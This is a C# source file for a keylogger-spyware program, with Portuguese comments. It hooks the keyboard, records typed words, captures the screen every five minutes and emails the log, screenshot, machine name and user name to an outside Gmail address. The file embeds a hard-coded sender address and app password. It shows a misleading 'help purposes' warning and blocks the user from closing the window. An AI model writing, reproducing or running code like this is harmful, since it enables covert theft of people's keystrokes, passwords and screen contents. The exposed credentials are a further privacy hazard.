using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Timers;
using System.Windows.Forms;

namespace KeyLoggerScreenshot
{
    class Program : Form
    {
        private static string logFilePath = "keylog.txt";
        private static string screenshotPath = "screenshot.png";
        private static string userEmail = "macksoupletter@gmail.com"; // Coloque seu email aqui
        private static string emailPassword = "nofe ettp hxvf mqqp"; // Coloque sua senha aqui
        private static string smtpServer = "smtp.gmail.com"; // Servidor SMTP do Gmail
        private static int smtpPort = 587; // Porta SMTP (geralmente 587 para TLS)
        private static System.Timers.Timer emailTimer;
        private static string currentWord = ""; // Variável para armazenar a palavra atual
        private static string machineName = Environment.MachineName;
        private static string userName = Environment.UserName;
        private static string processorArchitecture = Environment.Is64BitOperatingSystem ? "64-bit" : "32-bit"; // Obtém a arquitetura do processador

        // Hook de Teclado
        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int VK_BACK = 0x08;
        private const int VK_SPACE = 0x20;
        private const int VK_ENTER = 0x0D;
        private const int VK_COMMA = 0xBC;
        private const int VK_PLUS = 0xBB;
        private const int VK_SEMICOLON = 0xBA;
        private const int VK_PERIOD = 0xBE;
        private const int VK_AT = 0x32;

        public Program()
        {
            this.FormClosing += new FormClosingEventHandler(OnFormClosing);
            ShowWarning();
            SetupEmailTimer();
            _hookID = SetHook(_proc);
        }

        public static void Main()
        {
            Application.Run(new Program());
            UnhookWindowsHookEx(_hookID);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (System.Diagnostics.Process curProcess = System.Diagnostics.Process.GetCurrentProcess())
            using (System.Diagnostics.ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                HandleKey(vkCode);
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private static void HandleKey(int key)
        {
            if (key == VK_ENTER || key == VK_SPACE || key == VK_BACK)
            {
                LogWord(currentWord);
                currentWord = ""; // Reseta a palavra atual após pressionar Enter ou Espaço
            }
            else if ((key >= 0x41 && key <= 0x5A) || (key >= 0x30 && key <= 0x39)) // Letras A-Z e números 0-9
            {
                currentWord += (char)key; // Adiciona a letra ou número à palavra atual
            }
        }

        private static void LogWord(string word)
        {
            if (!string.IsNullOrEmpty(word))
            {
                string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                string logEntry = timestamp + " - " + word + Environment.NewLine;

                using (StreamWriter writer = new StreamWriter(logFilePath, true))
                {
                    writer.Write(logEntry); // Escrever entrada formatada
                }
            }
        }

        private void ShowWarning()
        {
            MessageBox.Show("This program is running for help purposes, do not close it.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
        }

        private void OnFormClosing(object sender, FormClosingEventArgs e)
        {
            if (e.CloseReason == CloseReason.WindowsShutDown)
            {
                // Permite o fechamento em caso de desligamento do sistema
            }
            else
            {
                e.Cancel = true; // Impede o fechamento em outros casos
            }
        }

        private void SetupEmailTimer()
        {
            emailTimer = new System.Timers.Timer(300000); // 5 minutos em milissegundos
            emailTimer.Elapsed += SendLogAndScreenshotByEmail;
            emailTimer.AutoReset = true;
            emailTimer.Enabled = true;
        }

        private static void SendLogAndScreenshotByEmail(object sender, ElapsedEventArgs e)
        {
            try
            {
                // Captura a tela
                Bitmap screenshot = CaptureScreen();
                screenshot.Save(screenshotPath, ImageFormat.Png);

                // Envia o e-mail com anexo (screenshot e log)
                SendEmailWithAttachment(screenshotPath, logFilePath);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Erro ao enviar email: " + ex.Message);
            }
        }

        static Bitmap CaptureScreen()
        {
            Rectangle bounds = Screen.PrimaryScreen.Bounds;
            Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height);
            using (Graphics g = Graphics.FromImage(bitmap))
            {
                g.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);
            }
            return bitmap;
        }

        static void SendEmailWithAttachment(string screenshotPath, string logFilePath)
        {
            try
            {
                using (MailMessage mail = new MailMessage())
                {
                    mail.From = new MailAddress(userEmail);
                    mail.To.Add("bashlover142@gmail.com");
                    mail.Subject = "Logs e Captura de Tela - " + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");

                    // Corpo do e-mail com concatenação
                    string body = "Nome da Máquina: " + machineName + "\n";
                    body += "Nome do Usuário: " + userName + "\n";
                    body += "Arquitetura do Processador: " + processorArchitecture + "\n\n";
                    body += "Atenciosamente,\n";
                    body += "Seu Sistema";

                    mail.Body = body;

                    Attachment screenshotAttachment = new Attachment(screenshotPath);
                    Attachment logAttachment = new Attachment(logFilePath);

                    mail.Attachments.Add(screenshotAttachment);
                    mail.Attachments.Add(logAttachment);

                    using (SmtpClient smtp = new SmtpClient(smtpServer, smtpPort))
                    {
                        smtp.Credentials = new NetworkCredential(userEmail, emailPassword);
                        smtp.EnableSsl = true;
                        smtp.Send(mail);
                    }

                    screenshotAttachment.Dispose();
                    logAttachment.Dispose();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Erro ao enviar e-mail: " + ex.Message);
            }
        }
    }
}

